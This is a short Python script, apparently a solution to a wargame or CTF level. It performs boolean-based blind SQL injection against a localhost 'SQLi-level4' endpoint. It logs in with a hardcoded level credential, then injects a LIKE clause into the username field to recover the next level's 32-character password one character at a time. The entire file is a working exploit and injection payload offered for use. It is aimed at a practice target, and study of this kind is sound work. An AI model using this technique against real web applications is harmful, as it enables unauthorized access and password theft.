#!/usr/bin/python3
#Exploit per SQL blind boolean based
import requests, string, time

alphabet = string.ascii_letters + string.digits

url = 'http://127.0.0.1:5000/SQLi-level4'
user = 'level4'
pws = 'ApiBKyh5Xrk1WWTuPkkwNkMmP1RQW4co'
auth = (user, pws)

password = []
while (len(password) < 32):
    for ch in alphabet:
        print('level5:',''.join(password) + ch)
        data = {"username":"level5' and BINARY password LIKE \'" + "".join(password) + ch + "%\' #","submit":"Search"}
        response = requests.post(url, auth=auth, data=data)
        #time.sleep(0.1)
        if 'User exists !' in response.text:
            password.append(ch)
            break

print('password found! level5:' + ''.join(password))
